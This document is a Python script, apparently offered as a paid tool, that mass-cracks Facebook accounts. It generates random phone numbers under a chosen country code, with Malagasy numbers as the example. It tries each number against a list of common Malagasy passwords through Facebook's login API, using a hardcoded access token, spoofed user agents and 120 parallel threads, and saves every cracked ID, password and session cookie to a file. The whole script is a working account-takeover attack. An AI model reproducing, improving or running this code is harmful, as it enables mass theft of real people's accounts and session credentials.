#coding : Morijah
#update by :- Morijah619
#Script Owner :Morijah
#---------------------
try:
 import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,zlib,hashlib
 from string import *
 from concurrent.futures import ThreadPoolExecutor as fire
except ModuleNotFoundError: 
 os.system('pip install requests > /dev/null')
 exit('\n Run Again ')
 
ugent = []
for z in range(200):
 versi_android = str(random.randint(5,12))+".0.0"
 versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
 device = random.choice(["CPH1723", "CPH1901","CPH1920", "CPH1933", "CPH1937","CPH1937", "CPH1945", "CPH1951", "CPH1969", "CPH1979", "CPH1983", "CPH2005", "CPH2023", "CPH2083", "CPH2003", "CPH2004","CPH2269","vivo 1917", "vivo 1915", "vivo 1911", "vivo 1933", "vivo 1912","vivo 1920", "vivo 1921", "vivo 1910", "vivo 1927", "vivo 1913", "vivo 1923", "vivo 1926", "vivo 1928", "vivo 1931", "vivo 1935","SM-G975F","SM-G532G","SM-N975F","SM-G988U","SM-G977U","SM-A705FN","SM-A515U1","SM-G955F","SM-A750G","SM-N960F","SM-G960U","SM-J600F","SM-A908B","SM-A705GM","SM-G970U","SM-A307FN","SM-G965U1","SM-A217F","SM-G986B","SM-A207M","SM-A515W","SM-A505G","SM-A315G","SM-A507FN","SM-A505U1","SM-G977T","SM-A025G","SM-J320F","SM-A715W","SM-A908N","SM-A205F","SM-G988B","SM-N986B","SM-A715F","SM-A515F","SM-G965F","SM-G960F","SM-A505F","SM-A207F","SM-A307G","SM-G970F","SM-A107F","SM-G935F","SM-G935A","SM-A310F","SM-J320FN","Mi 11 Lite 5G  stable","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X MIUI","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","M2004J19PI MIUI","Xiaomi 12S Ultra","MIX 4","Mi 11i","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","MI 8 SE","Mi A3","Mi A4","MI 6","MI MAX 2","MI MAX 3","Xiaomi 12S Ultra ","Xiaomi 12SE Ultra ","Mi 11i","Mi 12i","Mi 10 Lite 5G","Mi 11 Lite 5G","Mi 12 Lite 5G","Mi 10 Lite 4G","Mi 10 Lite 4G","E6653"," G8231","C6603"," D6503","SO-05F","SGP612","802SO","J9110","SOV40","SO-51A","XQ-AT51"," SOG01","SO51Aa","XQ-AT42","SO-51B","XQ-BC52","XQ-BC62","XQ-BC72","SOG03","J9150","I4113","I3113","I3123","I3113","901SO","J3273","XQ-CC72","XQ-BT44","SO-41B"," C2304","E5506","G3311"," C1905","D5322","Pixel 6a","Pixel 4","Pixel 5","Pixel 4 XL","Pixel 6","Pixel 6 Pro","Pixel 7 Pro","Pixel 4a","Pixel C","Pixel 5a","Pixel 2 XL","Pixel 2","Pixel Slate","Google Pixelbook Go","Google Pixelbook Go","Pixel XL","Pixel 3a","RMX1831","RMX1911","RMX1971","RMX2030","RMX2076","RMX2081","RMX2151","RMX2176","RMX2185","RMX2193","RMX2194","RMX2195","RMX3061","RMX3017","RMX3042","RMX1231"])
 dev = device.split(" Build/")[0]
 az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
 build = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
 versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
 verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
 mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
 ua = f"UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; id; CPH2387) U2/1.0.0 UCBrowser/9.9.0.543 Mobile [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/193013937;FBDM/"+"{density=2.625,width=1080,height=1794};"+f"FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.mlite;FBDV/Pixel 2;FBSV/{versi_android};FBBK/1;FBOP/1;FBCA/arm64-v8a:;"
 if ua in ugent:pass
 else:ugent.append(ua)
#---------------------Morijah-LOGO---------------------#
logo ='''
 
  __  __ _____      _     __ __  ___  
 |  \/  |  __ \    | |   / //_ |/ _ \ 
 | \  / | |__) |   | |  / /_ | | (_) |
 | |\/| |  _  /_   | | | '_ \| |\__, |
 | |  | | | \ \ |__| | | (_) | |  / / 
 |_|  |_|_|  \_\____/   \___/|_| /_/  
                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
\033[1;37m-------------------------------------------------
\033[1;91m Author     : Mr MORIJAH
\033[1;91m GitHub     : MORIJAH617
\033[1;91m Status     : PAID
\033[1;37m--------------------------------------------------
'''
loop = 0
oks = []
pcp=[]
cps=[]
#---------------------Morijah-MENU---------------------#
def menu():
 os.system('clear')
 print(logo)
 print('[1] Random Crack ')
 print('[0] Exit Menu')
 print(47*'-')
 opt = input('[?] Choose : ')
 if opt =='1':
  mg_randome()
 elif opt =='0':
  menu()
 else:
  print('\033[1;91m [•] Choose valid option\033[0;97m')
#---------------------Morijah-RANDOM_CRACK---------------------#
def mg_randome():
 user=[]
 os.system('clear')
 print(logo)
 print('[+] For MG (+26133,+26134,+26132)ETC....')
 print(47*'-')
 kode = input('[?] Input Code : ')
 print(47*'-')
 limit = int('20000')
 for nmbr in range(limit):
  nmp = ''.join(random.choice(string.digits) for _ in range(7))
  user.append(nmp)
 with fire(max_workers=120) as jmk:
  os.system('clear')
  print(logo)
  tl = str(len(user))
  print('[+] Total Ids : \033[1;92m'+tl)
  print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mUPDATE RANDOME \033[1;97m)');print(47*'-');print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*'-')
  for psx in user:
   ids = kode+psx
   passlist = {psx,ids,'malala','malalako','fitahiana','sitraka','sariaka','santatra','zanako','rafotsy','niaina','narindra','anjara','tsilavina','vadiko','faniry','tahina','rakoto','fitiavana','malagasy','sitraka','razafy','anjara','sarobidy','vahatra','lahatra','fandresena','nantenaina','nomena','niaina','mandresy','hasina','ravaka','malalatiana','felana','valisoa','gasikara','madagascar','tsiresy','milely','vadiko','faneva','tiavina','fanomezana','fanomezantsoa','sahaza','avotra','tafita','mamiko','mamako','zanako','jesosy','finoana','fiderana','nomentsoa','lelena','mirana','fitahiana','fitahina','badoda','mahery','lataka','mamisoa','anjara','lahatra','minosoa'}
   jmk.submit(rndm,ids,passlist)
 print(47*'\n\033[1;37m-')
 print('[√] Crack process has been completed')
 print('[?] Total Ok Id Save in  /sdcard/Morijah-OK.txt')
 print('[?] Total Cp Id Save in  /sdcard/Morijah-CP.txt')
 print(47*'-')
 print(' Press Inter To Back Menu')
#---------------------START-CRACK---------------------#
def rndm(ids,master_pass):
 try:
  global ok,loop
  session = requests.Session()
  sys.stdout.write('\r\r\033[1;37m [MASTER-CRACK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
  for pas in master_pass:
   fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
   fbbv = str(random.randint(111111111,999999999))
   android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
   model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
   build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
   fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
   fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
   uwa = ('Dalvik/2.1.0 (Linux; U; Android ' + android_version + '; ' + model + ' Build/' + build +
              ') [FBAN/Orca-Android;FBAV/' + fbav + ';FBBV/' + fbbv + ';FBRV/0;FBPN/com.facebook.orca;' +
              'FBLC/en_US;FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBDV/' + model + ';FBSV/' + android_version +
              ';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=' + str(random.randint(1, 9)) + '.' +
              str(random.randint(1, 9)) + ',width=' + str(random.randint(500, 999)) + ',height=' +
              str(random.randint(999, 1999)) + '};FB_FW/1;]' +
              '[FBAN/FB4A;FBAV/394.0.0.40.107;FB_IAB/FB4A;FBAV/388.0.0.32.105;FBRV/0;FBPN/com.facebook.katana;' +
              'FBLC/id_ID;FBMF/Alcatel;FBBD/Alcatel;FBDV/Alcatel 3L 2020;FBSV/10;FBCA/armeabi-v8a:armeabi;' +
              'FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]')
   data ={"locale": "en_GB","format": "json","email": ids,"password": pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
   head = {'user-agent':ua,'Host':'graph.facebook.com','Content-Type':'application/json;charset=utf-8','Content-Length':'595','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
   po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
   if 'session_key' in po:
    uid = po['uid']
    coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
    print('\r\r\033[1;32m [MORIJAH-OK🔒] '+str(uid)+' | '+pas+'\033[1;97m')
    print('\r\r\033[1;37m [COOKIES] %s   '%(coki))
    open('/sdcard/MORIJAH-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
    oks.append(str(uid))
    break
   elif 'www.facebook.com' in po['error']['message']:
    uid = po['error']['error_data']['uid']
    #print('\r\r\x1b[1;33m [MORIJAH-CP💔] '+str(uid)+' | '+pas+'\033[1;97m')
    open('/sdcard/MORIJAH-CP.txt','a').write(str(uid)+'|'+pas+'\n')
    cps.append(str(uid))
    break
   else:continue
  loop+=1
 except requests.exceptions.ConnectionError:
  time.sleep(20)
 except Exception as e:
  pass
menu()
